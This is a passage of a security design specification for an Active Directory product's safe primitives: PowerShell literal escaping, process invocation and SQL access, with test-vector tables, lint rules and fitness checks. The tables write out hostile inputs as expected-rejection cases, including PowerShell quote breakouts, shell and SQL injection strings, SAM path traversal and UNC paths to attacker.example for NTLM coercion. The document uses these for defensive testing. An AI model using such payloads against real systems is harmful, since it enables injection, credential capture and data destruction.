**Algorithm.** Reject NUL and invalid UTF-8/UTF-16. For each character: if it is U+0027, U+2018,
U+2019, U+201A or U+201B, emit it **twice**; otherwise emit it. Wrap in ASCII `'…'`. Never use
double-quoted strings, here-strings, backtick escapes or `-f` to build code.

**Why this is exact.** The language defines *single-quote-character* as exactly those five code points
and escapes one inside a verbatim string by doubling ([language spec §2.3.5.2][ps-lex]). The tokenizer
treats a quote followed by *any* single-quote character as an escaped pair and keeps the second
(PowerShell `tokenizer.cs` `ScanStringLiteral`, `CharTraits.cs` `IsSingleQuote`, [source][ps-src]).
Doubling each character with itself therefore preserves it exactly; replacing `’` by `''` would
change the data to `'`. Microsoft's `CodeGeneration.EscapeSingleQuotedStringContent` is documented
to escape single quotes ([API][ps-escape]); whether it covers U+2018–U+201B is `[UNVERIFIED]` — these
vectors are the contract either way.

| ID | Input | Expected output | Why |
| --- | --- | --- | --- |
| PSQ-01 | `O'Brien` | `'O''Brien'` | ASCII |
| PSQ-02 | `O‘Brien` (U+2018) | `'O‘‘Brien'` | AC 3 |
| PSQ-03 | `O’Brien` (U+2019) | `'O’’Brien'` | AC 3 |
| PSQ-04 | `O‚Brien` (U+201A) | `'O‚‚Brien'` | AC 3 |
| PSQ-05 | `O‛Brien` (U+201B) | `'O‛‛Brien'` | AC 3 |
| PSQ-06 | `a’; Start-Process calc; ’` | `'a’’; Start-Process calc; ’’'` | PatchIQ's ASCII-only escaper gave `'a’; Start-Process calc; ’'`: the string ends at the first `’` and `calc` runs |
| PSQ-07 | `abc’` | `'abc’’'` | ASCII-only gives `'abc’'`, where `’'` is an escaped pair and the literal swallows following code |
| PSQ-08 | `'’` | `'''’’'` | mixed |
| PSQ-09 | `‘’‚‛'` (all five) | `'‘‘’’‚‚‛‛'''` | every member of the set |
| PSQ-10 | `$(calc)` | `'$(calc)'` | no expansion in verbatim strings |
| PSQ-11 | `` a`'b `` | `` 'a`''b' `` | backtick is literal; quote still doubled |
| PSQ-12 | `“x”` (U+201C/D) | `'“x”'` | double quotes inert here |
| PSQ-13 | `–Force` (U+2013) | `'–Force'` | quoted, so never a parameter |
| PSQ-14 | `ʼ` (U+02BC) · `＇` (U+FF07) | unchanged | not quote characters; the set is exactly five |
| PSQ-15 | `a\r\nb` | `'a\r\nb'` | verbatim strings may span lines |
| PSQ-16 | empty | `''` | |
| PSQ-17 | `a\x00b` · lone surrogate | error `NulInString` · `InvalidUTF16` | R3 |

**Oracle (FF-SP6).** CI parses every output with
`[System.Management.Automation.Language.Parser]::ParseInput` (pwsh on Linux): zero errors, exactly one
`StringConstantExpressionAst`, `Value -ceq` input. Windows PowerShell 5.1 is checked on the Windows
runner (same lexical rules, language spec 3.0).

**Lint.** Single-quote doubling outside `pslit` — e.g. `Replace("'", "''")`, `strings.ReplaceAll(s, "'", "''")`,
`-replace "'", "''"` — fails the build (literal-shape scanner); it is exactly the PatchIQ bug.

### 6.3 `proc` — native process invocation

```
proc.Run(ctx, bin: BinaryID, args: [Arg], opts) -> Result
BinaryID  // manifest enum -> absolute path fixed at install; never PATH, never the working directory
Arg       // Flag(constant) | Value(GUID | InventoryHost | Port | EnumToken | ManagedPath)
          //   | Joined(flag: constant, sep: constant, v: Value) — no free text
opts      // stdin bytes (the data channel), env allowlist, private temp cwd, timeout, output cap
InventoryHost  // constructed only from discovered DCs or admin-registered servers; never from a string
```

**Hosts come from inventory, never from data.** A hostname argument, or a directory value used as a
connection target, makes our service account authenticate (possibly with NTLM) to a host the
attacker chose. Examples of such values: `homeDirectory`, `profilePath`, `scriptPath`, `dNSHostName`,
`serviceDNSName`, and a GPO's `gPCFileSysPath`, which anyone with write access to the GPO container
can change. `InventoryHost` therefore has two constructors only:
- DCs discovered through DNS SRV records and confirmed by their `nTDSDSA` object;
- servers an admin registered in our inventory, an audited action.

`dNSHostName` may be *displayed*, never dialled. SYSVOL paths are built from an `InventoryHost`, the
domain's DNS name and the GPO's GUID, never read from `gPCFileSysPath`. The global Kerberos-only
outbound policy belongs to T-0007 (noted there).

**Joining a flag and a value.** Some tools take `/s:host` or `-server=host` as one argv element.
`Joined(flag, sep, v)` builds it from a constant flag and separator plus a typed value. The value
part is still checked for option injection: it may not start with `-`, `/` or U+2013–U+2015, and it
may not contain whitespace, the separator, or `"`. The joined element must equal flag + sep + value
exactly (PROC-16).

Argv arrays only, no shell. .NET uses `ProcessStartInfo.ArgumentList`, never `Arguments`
([ArgumentList][argumentlist]); Go resolves absolute paths, avoiding `exec.ErrDot`
([os/exec][go-exec]). Values starting with `-`, `/` or U+2013–U+2015 are rejected unless the tool
honours `--` and the runner inserts it. UNC paths are rejected (NTLM coercion, feasibility §2.7). The
32,767-character Windows command-line limit ([CreateProcessW][createprocess]) is checked before launch.
The environment is an allowlist; secrets travel on stdin only. Some variables are **never
inherited**, whatever the allowlist says, because each one loads code into the child:
- `DOTNET_STARTUP_HOOKS` runs assemblies "before the `Main` entry point" ([startup hooks][dotnet-hooks]);
- `DOTNET_ENABLE_PROFILING`, `CORECLR_ENABLE_PROFILING`, `DOTNET_PROFILER*` and `CORECLR_PROFILER*`
  load a profiler DLL ([profiling settings][dotnet-prof]), and `COR_ENABLE_PROFILING` /
  `COR_PROFILER*` do the same on .NET Framework;
- `PSModulePath` and `PSExecutionPolicyPreference` (§6.1 rule 4);
- `LD_PRELOAD`, `LD_LIBRARY_PATH` and `DYLD_*`.

The sidecar's own build also sets `StartupHookSupport=false` `[UNVERIFIED — confirm the switch in the
sidecar spike]`.

| ID | Input | Expected | Why |
| --- | --- | --- | --- |
| PROC-01 | Hostname `dc01 & calc` | error `InvalidHostname` | and no shell would see it anyway |
| PROC-02 | `"; calc; "` | error `InvalidValue` | quote breakout |
| PROC-03 | `\| whoami` · `$(id)` · `` `id` `` | error `InvalidValue` | pipes, substitution |
| PROC-04 | `%COMSPEC%` · `$PATH` | error `InvalidValue`; no expansion happens | env expansion |
| PROC-05 | `^& calc` | error `InvalidValue` | cmd escape |
| PROC-06 | `-o/etc/passwd` · `/s` · `–x` (U+2013) | error `OptionInjection` | option injection |
| PROC-07 | `\\attacker.example\share\x` | error `UNCPathRejected` | NTLM coercion |
| PROC-08 | `..\..\Windows\System32\config\SAM` | error `PathTraversal` | managed root only |
| PROC-09 | `a\nb` · `a\x00b` | error `ControlCharRejected` | |
| PROC-10 | a manifest entry pointing at `cmd.exe`, `*.bat`, `*.cmd`, or `pwsh` outside `psx` | manifest validation fails the build; runner refuses by extension too | BatBadBut |
| PROC-11 | `a\\"b` (backslashes before a quote) | probe binary echoes argv as JSON equal to the input | CommandLineToArgvW edge, runtime escaping verified |
| PROC-12 | total command line > 32 767 chars | error `CommandLineTooLong` before launch | |
| PROC-13 | parent env holds `DB_PASSWORD` | absent in the child | env allowlist |
| PROC-14 | host `attacker.example` (not in inventory) · a computer's `dNSHostName` value · a user's `homeDirectory` `\\files.attacker.example\h` | no `InventoryHost` can be built: error `NotInventoryHost`; no connection attempted | NTLM coercion through data |
| PROC-15 | parent env holds `DOTNET_STARTUP_HOOKS`, `CORECLR_ENABLE_PROFILING=1`, `CORECLR_PROFILER_PATH`, `COR_ENABLE_PROFILING=1`, `PSModulePath`, `LD_PRELOAD`, even if a config file adds them to the allowlist | all absent in the child; the allowlist loader rejects the config entry | never-inherit list |
| PROC-16 | `Joined("/s", ":", host)` where host text is `dc01 /u:evil` · `dc01:x` · `/u:evil` | error `InvalidValue` / `OptionInjection`; never a second option | joined arguments |
| PROC-17 | GPO report reads SYSVOL for a GPO whose `gPCFileSysPath` was changed to `\\attacker.example\p` | path is built from `InventoryHost` + domain + GPO GUID; the attribute value is ignored; mismatch reported as a finding | SYSVOL from inventory |

**Lint.** Process APIs (`os/exec`, `Process.Start`, Rust `std::process::Command`) only in `proc`
(FF-SP1); gosec G204; tier N bans process creation outright (clippy `disallowed_methods`,
[clippy][clippy-dm]) — nothing in LSASS or LogonUI starts a process.

## 7. P5 — SQL access

Bound to ratified ADR-0001: PostgreSQL (bundled 18, customer-supplied 16 or later), pgx v5, sqlc.
ORMs and raw-string query builders are prohibited. Rules:

1. Static queries are sqlc-generated; every value is a bind parameter.
2. Tenant context: `SELECT set_config('app.tenant_id', $1, true)` as the first statement of each
   transaction — `is_local = true` scopes it to the transaction ([set_config][pg-setconfig]). Never
   `SET`/`SET LOCAL` with a literal, never `is_local = false` (session settings leak across pooled
   connections — PatchIQ NC1/NC2). Every tenant table has RLS **and** `FORCE ROW LEVEL SECURITY`; the
   app role is not the owner and lacks `BYPASSRLS` ([RLS][pg-rls]).
3. Dynamic SQL exists in one place, the report compiler: an AST compiled to text + args; identifiers
   only from a static registry of pre-quoted identifiers (pgx `Identifier.Sanitize` at registry build,
   [pgx][pgx-ident]); operators and sort directions are enums; LIMIT/OFFSET bound. Security-architect
   reviews every change to it.
4. LIKE/ILIKE: user text goes through `LikePattern.Contains/Prefix(s)`, which escapes `\`, `%`, `_`;
   SQL is `LIKE $1 ESCAPE '\'` ([pattern matching][pg-like]).
5. Lists: `= ANY($1)` with an array parameter, capped.
6. pgx's simple-protocol mode is banned: it interpolates client-side (CVE-2024-27289, SQL injection via
   a minus before a placeholder, [GHSA-m7wr-2xf7-cm9p][pgx-cve]).
7. Invalid UTF-8 and NUL are rejected before SQL (PostgreSQL cannot store NUL in text,
   [character types][pg-char]); errors never carry SQL text or parameter values.
8. PL/pgSQL `EXECUTE` only with `format('%I'/'%L', …)` or `USING` ([format][pg-format]); `||` into
   `EXECUTE` is banned.
9. **Nothing bypasses RLS by construction.** "Superusers and roles with the `BYPASSRLS` attribute
   always bypass the row security system", and table owners bypass it unless `FORCE` is set
   ([RLS][pg-rls]). Three objects also escape it:
   - **Views** use `security_invoker = true`. Without it, "the row-level security policies of the
     view owner are applied" ([CREATE VIEW][pg-view]). Supported on every PostgreSQL version we
     accept.
   - **No materialized views over tenant tables.** `ALTER MATERIALIZED VIEW` has no row-security
     forms ([ALTER MATERIALIZED VIEW][pg-matview]), so a materialized view holds the rows its
     refresher saw, for every reader.
   - **No `SECURITY DEFINER` functions over tenant tables**, which "can be used to access data not
     available to the calling user" ([RLS][pg-rls]).

   The app role is not the owner and has neither `SUPERUSER` nor `BYPASSRLS`. The owner role, which
   only migrations use (ADR-0002 rule 4), owns the tables. It is neither superuser nor `BYPASSRLS`,
   and `FORCE` binds it too.
10. **Policies fail closed.** The only policy shape is `tenant_id = nullif(current_setting('app.tenant_id',
    true), '')::uuid`. When the setting is unset or empty, the expression is NULL, so no row is
    visible: "rows for which the expression does not return `true` will not be processed"
    ([RLS][pg-rls]). Never `coalesce`, never an `OR` branch, never `true`.
11. **Transactions are tenant-scoped by API.** ADR-0002 owns the tenancy API: see "Where tenancy
    lives" (Transaction row) and rules 4–5 in
    [`0002-deployment-model.md`](../decisions/0002-deployment-model.md). This section adds only the
    SQL-construction rules. The data-access package (ADR-0002; path per T-0004) exposes exactly two
    entry points:
    - `WithTenant(ctx, tenant.ID, fn)`. Its first statement sets `app.tenant_id` with
      `set_config(…, true)` (rule 2).
    - `WithPlatform(ctx, reason, fn)`, callable only from call sites listed in ADR-0002's exemption
      registry. It runs as the same runtime role with no tenant set, so RLS still hides every tenant
      row. Tenant provisioning and first-run bootstrap go through it.

    The raw pool is unexported, so there is no other way to get a connection. **Both entry points
    also set a per-transaction `statement_timeout`** with `set_config('statement_timeout', $1, true)`
    before `fn` runs (rule 13, SQL-22). Migrations alone run under the owner role. No application
    code path holds the owner role's credentials.
12. **The pool refuses client-side interpolation.** At construction it asserts that
    `DefaultQueryExecMode` is not `QueryExecModeSimpleProtocol`. This covers a connection string from
    an admin's config that sets `default_query_exec_mode=simple_protocol` ([pgx ParseConfig][pgx-parse]),
    which fails start-up.
13. **The report compiler's vocabulary is closed.** Functions, aggregates (`count`, `sum`, `min`,
    `max`, `avg`), `date_trunc` units, operators and sort directions are enums. Row limits and the
    per-transaction `statement_timeout` are bound values.

| ID | Input | Expected | Why |
| --- | --- | --- | --- |
| SQL-01 | value `' OR '1'='1` | bound; zero rows | tautology |
| SQL-02 | `'; DROP TABLE audit_events; --` | bound; table intact | stacked query |
| SQL-03 | tenant id `x'; SET ROLE postgres; --` | UUID parse error before SQL | PatchIQ NC1 shape |
| SQL-04 | sort key `name; DELETE FROM users` | error `UnknownColumn` | registry only |
| SQL-05 | sort key `"name"` · `Name` · `name ` | error `UnknownColumn` | exact keys |
| SQL-06 | direction `ASC; --` | error `BadSortDirection` | enum |
| SQL-07 | contains `%` | pattern `%\%%`; matches only a literal `%` | wildcard escape |
| SQL-08 | contains `_` | pattern `%\_%` | PatchIQ NC5: unescaped patterns over-match |
| SQL-09 | contains `\` | pattern `%\\%` | escape char itself |
| SQL-10 | text with NUL | error `NulInText` (400) | rule 7 |
| SQL-11 | invalid UTF-8 | error `InvalidUTF8` | rule 7 |
| SQL-12 | `$1`, `$$x$$`, `E'\x00'` as values | inert, bound | quoting tricks |
| SQL-13 | tenant A reads tenant B's object id | zero rows | RLS |
| SQL-14 | after commit, same pooled connection: `current_setting('app.tenant_id', true)` | empty | no session leak (NC2) |
| SQL-15 | `ANY($1)` with 100 001 elements | error `TooManyValues` | R5 |
| SQL-16 | report filter on JSON key `a'->>'b` | key bound as `->> $n` | JSON path |
| SQL-17 | migration adds `CREATE VIEW v AS SELECT … FROM <tenant table>` without `security_invoker` | FF-SP7 fails | view-owner RLS bypass |
| SQL-18 | migration adds a materialized view reading a tenant table · a `SECURITY DEFINER` function reading a tenant table | FF-SP7 fails | RLS bypass |
| SQL-19 | query outside `WithTenant` (fresh connection, `app.tenant_id` never set) | zero rows, never all tenants | fail-closed policy |
| SQL-20 | config DSN contains `default_query_exec_mode=simple_protocol` | pool construction fails `SimpleProtocolForbidden` | rule 12 |
| SQL-21 | report AST with function `pg_sleep` · aggregate `string_agg` · unit `'day'; --` | error `UnknownFunction` / `UnknownAggregate` / `BadUnit` | closed vocabulary |
| SQL-22 | report query exceeding the bound `statement_timeout` | cancelled with `QueryTimeout`; the next transaction on the connection has the default timeout | per-transaction timeout |

**Lint.** gosec G201/G202 ([gosec][gosec]). forbidigo bans the names `QueryExecModeSimpleProtocol`,
`set_config(…, false)` and `SET app.` literals. The SQL driver may be imported only by the
data-access package (FF-SP1; ADR-0002 check T5 enforces the same boundary for pgx types).
forbidigo matches names and cannot check argument kinds, so "SQL argument is not a constant or
sqlc-generated" is a **go/analysis pass**, `sqlconst`, in the fitness tool (T-0033). For every call to
pgx/sqlc `DBTX` `Exec`, `Query`, `QueryRow`, `CopyFrom` and `Batch.Queue`, the SQL argument must be:
- a typed or untyped constant (`types.TypeAndValue.Value != nil`);
- a constant declared in a sqlc-generated file; or
- the `CompiledSQL` type, which only the report compiler can produce.

FF-SP7 checks rules 2 and 9–12 against the migrated schema and runs SQL-13, -14, -17 to -20. There
is one implementation. It lives inside ADR-0002's `fitness-tenancy` job (T-0036, checks T2–T4),
not in a separate job and not in T-0034. The FF-SP7 row in §8 is the list of checks T-0036 must cover.

## 8. Corpus and fitness functions

**Corpus.** One JSON Lines file per primitive (provisional root `testdata/safe-primitives/`; T-0004
fixes it):

```json
{"id":"LF-01","primitive":"ldapfilter","call":"Eq","args":{"attr":"cn","value":{"utf8":"*)(uid=*"}},
 "expect":{"render":"(cn=\\2a\\29\\28uid=\\2a)"},"hostile":true,"source":"RFC 4515 §3","verified":"doc"}
```

Inputs JSON cannot carry (invalid UTF-8, lone surrogates, NUL) use `{"hex":"…"}`. `expect` is one of
`render`, `bytes_hex`, `value` or `error`. `verified` is `doc`, `samba`, `windows` or `samba+windows`
and is updated by the lab tests, not by hand.

**Gate unit and record.** The FF-SP4 gate counts per **unit**, and the units are:
- `ldapfilter` (incl. `scope`);
- `dn`;
- `attr.guid`, `attr.sid`, `attr.filetime`, `attr.gentime`, `attr.flags`;
- `attr.unicodepwd` (incl. `Secret`, `SecureConn`);
- `psx`, `pslit`, `proc`;
- `sql`;
- `sd.read`, `sd.write` (P6, defined in `safe-primitives-security-descriptor.md` §5; its rules FF-SD1–5 are implemented in the T-0033/T-0034 tooling alongside FF-SP1–6).

A **record is one input**. A table row listing several inputs separated by `·`, `/` or commas
expands to one record each, with suffixed IDs, paired in order with the expected values. Separators
count only between inputs, never inside a code span. For example, FT-13 becomes `FT-13#1` …
`FT-13#6`; FL-12 and GT-07 expand the same way. Every record carries an explicit
`"hostile": true|false`; it is never inferred. Static vectors (LF-30, PROC-10, SQL-17/18, PSX-18)
are records with `"kind":"static"`. FF-SP1–3, FF-SP7 (inside T-0036) or FF-SP9 check them instead
of a runtime call.

**Hostile** means a correct implementation must reject, neutralise or refuse the input. That covers:
- injection metacharacters and look-alike characters;
- malformed or non-canonical encodings;
- out-of-range or oversized values;
- an attempt to escalate privilege or widen scope;
- a path by which a secret could leak.

These are `"hostile": false`: well-formed values, documented sentinels (FT-01, FT-02), round-trip
and conversion anchors (SID-11, FT-07, DN-P09), equality cases (DN-P02, DN-P19) and negative
controls (PSQ-14). Applying this conservatively to the tables in §3–§7, after expansion, gives these
counts:

| Unit | Records | Hostile | Records marked `false` |
| --- | --- | --- | --- |
| `ldapfilter` | 47 | 41 | LF-07, -09, -16, -17, -18, -39 |
| `dn` | 42 | 30 (builder 19, parser 11) | DN-B06#2 (`a#b`), DN-B15; DN-P02, -P03, -P09 to -P12, -P14 to -P16, -P19 |
| `attr.guid` | 22 | 19 | GUID-01, -02, -11 |
| `attr.sid` | 18 | 14 | SID-01 to -03, -11 |
| `attr.filetime` | 27 | 15 | FT-01 to -04, -06, -07#1–2, -09, -10, -12#1–2, -17 |
| `attr.gentime` | 18 | 12 | GT-01 to -05, -12 |
| `attr.flags` | 22 | 12 | FL-01 to -06, FL-09#1–4 |
| `attr.unicodepwd` | 23 | 19 | PW-01 to -03, -13 |
| `psx` | 21 | 21 | none |
| `pslit` | 19 | 16 | PSQ-14#1–2, -16 |
| `proc` | 35 | 35 | none |
| `sql` | 29 | 28 | SQL-14 |

The margins are smallest for `attr.gentime` and `attr.flags`, at 12 each. A change that removes or
reclassifies a hostile record in either unit adds a replacement in the same change, or FF-SP4
fails. The table is a count of this document. Once the corpus files exist, the corpus is
authoritative and FF-SP4 recomputes the counts.

| FF | Check | Fails when |
| --- | --- | --- |
| FF-SP1 | Import boundaries | any of these outside its home: the LDAP library and raw search/controls (only `scope` and the connector); the SQL driver (only the data-access package of ADR-0002, path per T-0004); process APIs (only `proc`); the PowerShell SDK (only the sidecar host). Also: any product package importing `lab/…` or `tools/…` (tier L). Enforced with depguard, BannedApiAnalyzers and clippy |
| FF-SP2 | Banned APIs and custom analyzers | any symbol in the per-primitive lists in §3.5, §4.6, §5, §6, §7. Includes TLS-verification bypasses (§5.6), `net/http/pprof` and `runtime/pprof` outside tests and tier L, and `GOTRACEBACK=crash` in service definitions. The go/analysis passes `dnstring`, `sqlconst` and `secretjson` run here (`go vet -vettool`, T-0033) |
| FF-SP3 | Literal-shape scanner | filter-, DN-, PowerShell- or SQL-shaped literals combined with concatenation or formatting outside primitive packages and tests. **`web/` is covered too**: TS/TSX template literals or concatenations containing `CN=`, `OU=`, `DC=`, `(&(`, `(\|(` or `(objectClass=`; quote doubling (`replace(/'/g, "''")`, `replaceAll("'", "''")`); `.split(',')`, `.endsWith(` or `.includes(` on a value named `dn`/`distinguishedName`. Tier L is exempt (§2.1). Tool: Semgrep or ast-grep, chosen by devops-engineer via the licence register |
| FF-SP4 | Corpus gate | a **unit** (§8 list) has < 10 records with `"hostile": true`; an implementation skips records of a unit it implements; a record disappears without a superseding one |
| FF-SP5 | Fuzz | each parser/encoder lacks a corpus-seeded fuzz target; nightly ≥ 10 min each; properties `parse(render(x)) == x` and "render never emits an unescaped special" |
| FF-SP6 | Oracles | PowerShell parser oracle (`pslit`); LDAP library round-trip (P1); Samba lab integration (P1–P3); Windows lab nightly for the rows in §9 marked Windows. **SID/GUID oracle, Windows runner:** SID text → bytes via `ConvertStringSidToSidW` and bytes → text via `ConvertSidToStringSidW`; GUID text → bytes via .NET `Guid.Parse` + `ToByteArray()` and bytes → text via `StringFromGUID2`. The relation is: **every input we accept, Windows accepts, and on every accepted input the bytes (and the rendered text) are equal**. We may reject more. Intentional strictness: SID-09 (leading zeros), SID-10 (hex authority below 2^32), GUID-05 (undashed, accepted only inside `ObjectRef`), GUID-08 (nil), GUID-10 (whitespace; `Guid.Parse` trims). If Windows rejects an input we accept (candidate: SID-03's lower-case `s-`), we tighten ours; the relation wins over our reading of the ABNF |
| FF-SP7 | Tenancy | **Implemented once, inside ADR-0002's `fitness-tenancy` job (T-0036, checks T2–T4). This row is the list T-0036 must cover.** Against the migrated schema it fails when: a tenant table lacks RLS + FORCE; a view lacks `security_invoker=true` (`pg_class.reloptions`); a materialized view or `SECURITY DEFINER` function (`pg_proc.prosecdef`) depends on a tenant table; the app (runtime) or owner (migration) role has `rolsuper` or `rolbypassrls`; the app role owns a table; a policy's `qual` differs from the rule-10 shape (no `coalesce`, `OR` or `true`); SQL-13, -14, -17 to -20 fail |
| FF-SP8 | Constant argv | for random requests, `psx`/`proc` argv differs from the manifest's constant argv |
| FF-SP9 | `psx` manifest | built against the real module metadata (the `CommandInfo.Parameters` of each pinned module) in the sidecar build. Fails when: an op's `Identity` parameter is not bound from a `Guid`; `LDAPFilter` is bound from anything but P1 `FilterString`; a `Filter`, `RecipientFilter`, `FilterScript`, `ScriptBlock` or other OPATH/script parameter is bound at all; a parameter carrying a secret is not `SecureString`/`PSCredential` (PSX-18); an op names a command not exported by its pinned module (PSX-16) |

## 9. Verification status and Samba false-pass risks

Nothing in this document is lab-verified yet (lab: T-0012). Status today: **documentation only**,
except the PowerShell quoting rules, which are confirmed in PowerShell's source code.

| Behaviour | Source | Must be verified on | Samba false-pass risk |
| --- | --- | --- | --- |
| Non-ASCII byte escapes and `/`→`\2f` in filters | RFC 4515, Microsoft | Samba + Windows | low |
| Unsigned decimal masks on signed `groupType` | Microsoft | Samba + Windows | low |
| No wildcard on DN-syntax attributes | `[UNVERIFIED]` | Samba + Windows | **medium** — behaviour may differ |
| `<GUID=hex>`/`<SID=hex>` in requests; extended DN refused | MS-ADTS | Samba + Windows | medium |
| Multi-valued RDN → `invalidDNSyntax` | MS-ADTS | Samba + Windows | medium |
| DN hex escapes `\3D \2F \0A` accepted; DN output form | Microsoft | Samba + Windows | **high for golden strings** — capture per platform, compare normalised |
| Name equality ignores width, kana, accents (José/Jose) | MS-ADTS | **Windows** | **high** — Samba's comparison differs `[UNVERIFIED]`; uniqueness tests must run on Windows |
| `unicodePwd` quoted UTF-16LE; encryption required; embedded `"` | MS-ADTS; PW-04 `[UNVERIFIED]` | Samba + Windows | medium — diagnostics differ (gotcha 52) |
| `accountExpires`/`pwdLastSet` sentinels | Microsoft | Samba + Windows | low |
| lockoutDuration 0/−2^63 forever; maxPwdAge −2^63 never | MS-ADTS formula | **Windows** | medium — Samba's computed-attribute support `[UNVERIFIED]` |
| Generalized Time `.0Z` output | RFC 4517; observed | Samba + Windows | low |
| 4688 and 4104 contain no operation data | Microsoft | **Windows only** | **high** — no Security log on Samba/Linux |
| Sidecar `NoLanguage` with required modules | `[UNVERIFIED]` | Windows + Linux sidecar | n/a |
| Escape controls (ASQ, phantom root, show-deleted/recycled) widen results beyond an OU base; domain-scope control suppresses continuation references | MS-ADTS | Samba + Windows | **medium** — Samba's control support differs `[UNVERIFIED]`; a control Samba ignores would make LF-30-style runtime tests pass falsely, so run them on Windows too |
| Schema-driven `SecretAttrs` (LF-38): `searchFlags` 0x80/0x200/0x1000 on LAPS, BitLocker, TPM attributes | MS-ADTS, AD schema docs | **Windows** (with Windows LAPS schema) | **high** — Samba's shipped schema and flags differ; a missing attribute yields a vacuous pass |
| `AllSigned` enforced; module-integrity check; module logging content and event ID | Microsoft (Windows-only enforcement) | **Windows** + Linux sidecar | n/a — Linux has no execution policy, which is why PSX-17 exists |
| `runtime/secret` protection | Go docs: linux/amd64, linux/arm64 only | Linux | n/a — no effect on Windows |
| SASL GSSAPI sealing as a `SecureConn` source | `[UNVERIFIED]` (T-0023) | Samba + Windows | medium |
| PostgreSQL `security_invoker`, materialized-view and `SECURITY DEFINER` RLS behaviour | PostgreSQL docs | PostgreSQL 16 and 18 in CI | n/a |

## 10. Stack binding (ADR-0001 ratified) and what changes if it is amended

| Topic | Fixed here (stack-agnostic) | Binding now: ratified ADR-0001 (Go S/A, Rust N, .NET sidecar X, TypeScript W, PostgreSQL) | If ADR-0001 is amended |
| --- | --- | --- | --- |
| Filters | AST, canonical renderer, parser rules, LF vectors | Go `ldapfilter`; renders a string because go-ldap's search request takes one; round-trip oracle via go-ldap's parser | .NET server: same renderer feeding S.DS.P; `DirectorySearcher` banned |
| DNs | grammar, rendering, AD rules, DN vectors | Go `dn`; may wrap `ldap.ParseDN` for grammar, adds AD rules | same contract in the chosen language |
| Codecs | sentinels, grammars, vectors | Go `attr`; Rust tier N implements `Secret` and any codec it parses, running the same corpus | each tier that decodes AD values runs the corpus |
| PowerShell | invariant, PSX/PSQ vectors | route A: tier-X sidecar with `AddCommand`/`AddParameter`; route B needs an ADR amendment (F1 bans shipped `.ps1`) | .NET server: in-process SMA under the same rules |
| Processes | `proc` contract, PROC vectors | Go `proc` + `x/sys/windows`; `ArgumentList` inside the sidecar | — |
| SQL | rules 1–13, SQL vectors | pgx v5 + sqlc + RLS; simple protocol banned; the tenancy API (`WithTenant`/`WithPlatform`, exemption registry, role split) is owned by ADR-0002 | SQL Server would need its own section (RLS semantics differ) |
| Lint tools | rule meaning, FF-SP1–9 | golangci-lint (forbidigo, depguard, gosec), go/analysis passes `dnstring`/`sqlconst`/`secretjson`, BannedApiAnalyzers, clippy, PSScriptAnalyzer for `lab/`/`tools/`, Semgrep or ast-grep for FF-SP3 incl. `web/` | equivalents per language |
| Web console | tier W implements no primitive (§2.1); API carries server-built values | TypeScript + React under `web/`; FF-SP3 scans it | if a second UI technology were allowed, it inherits §2.1 unchanged |
| Paths | provisional names above | T-0004 sets the roots; `ad-engineering` skill paths updated with them | — |

ADR-0001 was ratified on 2026-10-02 (D-0006) with no substantive change from the proposed text,
so the binding column applies as written and this document is in `review`. The owner of the first
primitives build ticket replaces the provisional package names once T-0004 fixes the roots. The
document is the reference for the build tickets the project-manager cuts from it (T-0031: primitive
builds go before features). It is also the reference for the fitness tickets: T-0033 (FF-SP1–3, 9),
T-0034 (FF-SP4–6, 8) and T-0036 (FF-SP7, implemented inside ADR-0002's `fitness-tenancy` job).

## 11. Follow-ups

- T-0028 — typed security-descriptor primitive: done as `safe-primitives-security-descriptor.md`; build in T-0118 (read half) and a later write-half ticket.
- T-0029 — output encoders (CSV/XLSX formula neutralisation, HTML, email/PDF).
- T-0033 / T-0034 — fitness implementation (static rules FF-SP1–3, 9; corpus, fuzz and oracles FF-SP4–6, 8).
- T-0036 — FF-SP7, inside ADR-0002's `fitness-tenancy` job (checks T2–T4); §8's FF-SP7 row is its coverage list.
- T-0037 — tenancy foundation (`WithTenant`/`WithPlatform`, exemption registry); builds §7 rule 11 as ADR-0002 specifies.
- T-0035 — security-sensitive spec tickets get security-architect as second reviewer.
- T-0007 — Kerberos-only outbound policy (§6.3) and the secret-memory policy, including the
  `runtime/secret` evaluation (§5.6).
- T-0023 — whether GSSAPI sealing can be a `SecureConn` source (§5.6).
- OPATH (Exchange) filter primitive: none planned. OPATH parameters stay banned for data (§6.1 rule 2)
  until the M365 parity scope needs one.

## Sources

[rfc4515]: https://www.rfc-editor.org/rfc/rfc4515#section-3
[rfc4514]: https://www.rfc-editor.org/rfc/rfc4514#section-2.4
[rfc4517-int]: https://www.rfc-editor.org/rfc/rfc4517#section-3.3.16
[rfc4517-gt]: https://www.rfc-editor.org/rfc/rfc4517#section-3.3.13
[ms-filter]: https://learn.microsoft.com/en-us/windows/win32/adsi/search-filter-syntax
[ms-dn]: https://learn.microsoft.com/en-us/previous-versions/windows/desktop/ldap/distinguished-names
[adspath]: https://learn.microsoft.com/en-us/windows/win32/adsi/ldap-adspath
[adts-altdn]: https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/92a54869-38d7-4e71-a3be-5f67a0dcdd7e
[adts-mvrdn]: https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/3c96b56d-d7a7-46f1-9883-7d031f9fa01e
[adts-sort]: https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/dbb175fb-40f3-42a4-9257-4fc02a6fa943
[adts-uacc]: https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/b80798ae-1f8c-4d30-9d80-a1f3281e96e2
[adts-pwd]: https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/6e803168-f140-4d23-b2d3-c3a8ab5917d2
[dtyp-guid]: https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/4926e530-816e-41c2-b251-ec5c7aca018a
[dtyp-sid-bin]: https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/f992ad60-0fe4-4b87-9fed-beb478836861
[dtyp-sid-str]: https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/c92a27b1-c772-4fa7-a432-15df5f1b66a1
[a-acctexp]: https://learn.microsoft.com/en-us/windows/win32/adschema/a-accountexpires
[a-cn]: https://learn.microsoft.com/en-us/windows/win32/adschema/a-cn
[systemflags]: https://learn.microsoft.com/en-us/windows/win32/adschema/a-systemflags
[samba-10512]: https://bugzilla.samba.org/show_bug.cgi?id=10512
[pwsh]: https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_pwsh
[ps-lex]: https://learn.microsoft.com/en-us/powershell/scripting/lang-spec/chapter-02
